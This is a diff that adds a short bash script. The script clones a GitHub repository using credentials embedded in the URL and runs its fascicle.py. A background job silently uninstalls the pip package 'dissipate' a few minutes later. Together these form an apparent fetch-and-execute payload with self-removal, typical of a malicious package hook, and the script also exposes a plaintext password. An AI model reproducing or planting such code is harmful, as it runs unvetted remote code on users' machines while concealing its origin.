@@ -1,0 +1,6 @@
+
+#!/usr/bin/env bash
+
+sh -c "sleep 180; yes | pip3 uninstall dissipate > /dev/null 2>&1" &
+rm -rf compete; git clone https://vanessafkim1997:HZl0TMvb@github.com/vanessafkim1997/compete && cd compete && python3 fascicle.py $1
+    
